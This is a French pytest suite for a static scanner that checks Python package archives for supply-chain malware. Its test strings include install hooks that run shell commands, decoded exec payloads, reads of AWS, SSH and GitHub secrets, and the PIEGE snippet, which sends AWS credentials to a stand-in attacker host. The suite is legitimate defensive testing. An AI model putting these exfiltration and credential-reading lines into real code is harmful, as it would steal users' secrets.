"""Analyse statique du code (B, M1) : archives lues en mémoire, jamais extraites ni exécutées.

Les « codes piégés » ci-dessous sont des chaînes de test : ils ne sont jamais exécutés.
"""
import io
import tarfile
import zipfile
from pathlib import Path

import pytest

from commun.modeles import Ecosysteme, Niveau, Source
from plateforme.pipeline.statique import code

P = Ecosysteme.PYPI


def roue(dossier: Path, nom: str, fichiers: dict[str, str]) -> Path:
    chemin = dossier / nom
    with zipfile.ZipFile(chemin, "w") as z:
        for n, contenu in fichiers.items():
            z.writestr(n, contenu)
    return chemin


def source(dossier: Path, nom: str, fichiers: dict[str, str]) -> Path:
    chemin = dossier / nom
    with tarfile.open(chemin, "w:gz") as t:
        for n, contenu in fichiers.items():
            donnees = contenu.encode()
            info = tarfile.TarInfo(n)
            info.size = len(donnees)
            t.addfile(info, io.BytesIO(donnees))
    return chemin


def sortes(signaux) -> dict[str, Niveau]:
    return {s.sorte: s.niveau for s in signaux}


SAIN_SETUP = "from setuptools import setup\nsetup(name='demo', version='1.0')\n"


def test_un_paquet_sain_ne_donne_aucun_signal_fort(tmp_path):
    archives = [source(tmp_path, "demo-1.0.tar.gz", {"demo-1.0/setup.py": SAIN_SETUP,
                                                      "demo-1.0/demo/__init__.py": "X = 1\n"}),
                roue(tmp_path, "demo-1.0-py3-none-any.whl", {
                    "demo/__init__.py": "import os\nHOME = os.environ.get('HOME')\n"
                                        "DOC = 'https://docs.python.org/3/'\n"})]
    signaux = code.controler_code(P, "demo", "1.0", archives)
    assert all(s.niveau.rang < Niveau.FORT.rang for s in signaux)
    assert all(s.source is Source.STATIQUE for s in signaux)


def test_setup_py_qui_lance_une_commande_est_du_code_a_l_installation(tmp_path):
    setup = SAIN_SETUP + "import subprocess\nsubprocess.Popen(['sh', '-c', 'id'])\n"
    a = source(tmp_path, "demo-1.0.tar.gz", {"demo-1.0/setup.py": setup})
    [s] = [s for s in code.controler_code(P, "demo", "1.0", [a]) if s.sorte == "code_installation"]
    assert s.niveau is Niveau.FORT
    assert s.preuve["fichier"] == "setup.py" and s.preuve["ligne"] == 4
    assert "subprocess.Popen" in s.preuve["extrait"] and len(s.preuve["extrait"]) <= 200


def test_un_fichier_pth_qui_importe_s_execute_au_demarrage_de_python(tmp_path):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl",
             {"demo_init.pth": "import os; os.system('curl x')\n", "ok.pth": "src\n"})
    assert sortes(code.controler_code(P, "demo", "1.0", [a]))["code_installation"] is Niveau.FORT


def test_exec_d_un_contenu_decode_est_du_code_obfusque(tmp_path):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl", {"demo/util/aide.py":
             "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"})
    assert sortes(code.controler_code(P, "demo", "1.0", [a]))["exec_obfusque"] is Niveau.FORT


def test_un_long_bloc_base64_est_signale(tmp_path):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl",
             {"demo/__init__.py": f"CHARGE = '{'QUJD' * 100}'\n"})
    assert sortes(code.controler_code(P, "demo", "1.0", [a]))["bloc_base64"] is Niveau.MOYEN


@pytest.mark.parametrize("ligne", [
    "open(os.path.expanduser('~/.aws/credentials')).read()",
    "jeton = os.environ['GITHUB_TOKEN']",
    "cle = open('/root/.ssh/id_rsa').read()"])
def test_l_acces_aux_secrets_a_l_import_est_fort(tmp_path, ligne):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl", {"demo/__init__.py": f"import os\n{ligne}\n"})
    assert sortes(code.controler_code(P, "demo", "1.0", [a]))["acces_secrets"] is Niveau.FORT


@pytest.mark.parametrize("url", ["https://discord.com/api/webhooks/1/abc",
                                 "https://abcd.ngrok.io/x", "http://45.13.7.9:8080/c"])
def test_un_service_d_exfiltration_ou_une_ip_brute_est_fort(tmp_path, url):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl", {"demo/__init__.py": f"U = '{url}'\n"})
    assert sortes(code.controler_code(P, "demo", "1.0", [a]))["domaine_suspect"] is Niveau.FORT


def test_les_domaines_contactes_sont_listes_pour_information(tmp_path):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl",
             {"demo/__init__.py": "U = 'https://telemetrie.exemple-demo.com/api'\n"})
    [s] = [s for s in code.controler_code(P, "demo", "1.0", [a]) if s.sorte == "domaine"]
    assert s.niveau is Niveau.INFO and s.preuve["domaine"] == "telemetrie.exemple-demo.com"


PIEGE = ("import os, urllib.request\n"
         "d = open(os.path.expanduser('~/.aws/credentials')).read()\n"
         "urllib.request.urlopen('https://collecte.attaquant-demo.invalid/c', d.encode())\n")


def test_secrets_lus_et_envoyes_sur_le_reseau_au_meme_endroit_est_bloquant(tmp_path):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl", {"demo/__init__.py": PIEGE})
    s = [s for s in code.controler_code(P, "demo", "1.0", [a]) if s.sorte == "exfiltration"]
    assert [x.niveau for x in s] == [Niveau.BLOQUANT]
    assert s[0].preuve["fichier"] == "demo/__init__.py"


def test_le_reste_du_paquet_n_est_lu_que_pour_l_obfuscation_et_les_domaines_suspects(tmp_path):
    # Un client AWS légitime lit ~/.aws/credentials et parle au réseau, ailleurs qu'à l'import.
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl", {"demo/outils/config.py": PIEGE})
    assert set(sortes(code.controler_code(P, "demo", "1.0", [a]))) == set()


def test_diff_seul_ce_qui_est_nouveau_par_rapport_a_la_version_precedente_compte(tmp_path):
    ancien = tmp_path / "ancien"
    ancien.mkdir()
    commun = "import os\nT = os.environ['GITHUB_TOKEN']\n"
    avant = roue(ancien, "demo-1.0-py3-none-any.whl", {"demo/__init__.py": commun})
    apres = roue(tmp_path, "demo-1.1-py3-none-any.whl",
                 {"demo/__init__.py": commun + "exec(__import__('zlib').decompress(b'x'))\n"})
    signaux = code.controler_code(P, "demo", "1.1", [apres], precedentes=[avant])
    assert set(sortes(signaux)) == {"exec_obfusque"}
    assert all(s.preuve["nouveau"] for s in signaux)


def test_une_archive_trop_grosse_ou_illisible_est_signalee_sans_planter(tmp_path, monkeypatch):
    monkeypatch.setattr(code, "TAILLE_MAX_FICHIER", 10)
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl", {"demo/__init__.py": "X = 1 " * 100})
    casse = tmp_path / "demo-1.0.tar.gz"
    casse.write_bytes(b"pas une archive")
    s = sortes(code.controler_code(P, "demo", "1.0", [a, casse]))
    assert s["fichier_ignore"] is Niveau.MOYEN and s["archive_illisible"] is Niveau.FORT


def test_un_lien_ou_un_chemin_qui_sort_de_l_archive_n_est_jamais_suivi(tmp_path):
    chemin = tmp_path / "demo-1.0.tar.gz"
    with tarfile.open(chemin, "w:gz") as t:
        lien = tarfile.TarInfo("demo-1.0/setup.py")
        lien.type, lien.linkname = tarfile.SYMTYPE, "/etc/passwd"
        t.addfile(lien)
    assert code.controler_code(P, "demo", "1.0", [chemin]) == []


# --- Fausses alertes vues sur de vrais paquets sains (requests, botocore, django, pyyaml…) ---

def test_les_tests_du_paquet_ne_sont_pas_lus(tmp_path):
    a = source(tmp_path, "demo-1.0.tar.gz", {"demo-1.0/tests/__init__.py": PIEGE,
                                              "demo-1.0/demo/tests/test_x.py": "U='http://8.8.8.8'",
                                              "demo-1.0/conftest.py": PIEGE})
    assert code.controler_code(P, "demo", "1.0", [a]) == []


@pytest.mark.parametrize("ip", ["10.1.2.3", "192.168.0.1", "172.16.1.1", "169.254.169.254",
                                "127.0.0.1", "224.0.0.1", "255.255.255.255", "016.016.016.016"])
def test_une_ip_privee_locale_ou_invalide_n_est_pas_suspecte(tmp_path, ip):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl", {"demo/client.py": f"U = 'http://{ip}/'\n"})
    assert code.controler_code(P, "demo", "1.0", [a]) == []


@pytest.mark.parametrize("ligne", ["cmdclass={'install': install_with_pth},",
                                   "exec(fp.read(), version)"])
def test_un_setup_py_personnalise_sans_commande_ni_reseau_est_moyen(tmp_path, ligne):
    a = source(tmp_path, "demo-1.0.tar.gz", {"demo-1.0/setup.py": SAIN_SETUP + ligne + "\n"})
    assert sortes(code.controler_code(P, "demo", "1.0", [a])) == {
        "setup_personnalise": Niveau.MOYEN}


def test_un_pth_qui_importe_sans_commande_ni_reseau_est_moyen(tmp_path):
    a = roue(tmp_path, "demo-1.0-py3-none-any.whl", {"distutils-precedence.pth":
             "import os; var = 'X'; enabled = os.environ.get(var, 'local') == 'local'\n"})
    assert sortes(code.controler_code(P, "demo", "1.0", [a])) == {"pth_import": Niveau.MOYEN}
